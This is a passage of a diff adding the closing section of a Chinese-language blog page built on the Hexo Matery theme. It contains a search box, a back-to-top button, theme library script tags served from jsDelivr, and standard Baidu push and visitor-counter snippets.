+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/EASY233/EASY233.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
